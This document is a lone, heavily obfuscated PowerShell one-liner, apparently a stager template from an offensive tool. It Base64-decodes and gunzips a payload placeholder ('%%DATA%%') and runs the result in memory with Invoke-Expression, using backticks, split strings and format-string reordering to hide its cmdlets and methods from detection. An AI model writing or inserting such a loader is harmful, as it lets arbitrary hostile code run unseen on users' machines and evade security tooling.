${S}=nEw`-ob`JecT ('IO.'+'Me'+'moryStream')(,[Convert]::("{1}{0}{2}{3}{4}"-f'rom','F','Base6','4Str','ing').Invoke('%%DATA%%'));I`Ex (n`EW`-OBj`Ect ('IO.Stre'+'a'+'mRe'+'ader')(N`eW-obj`eCT ('IO.Com'+'pr'+'e'+'ss'+'ion.Gzi'+'p'+'St'+'ream')(${S},[IO.Compression.CompressionMode]::"DECo`MPR`ESs"))).("{1}{2}{3}{0}"-f'ToEnd','R','e','ad').Invoke();

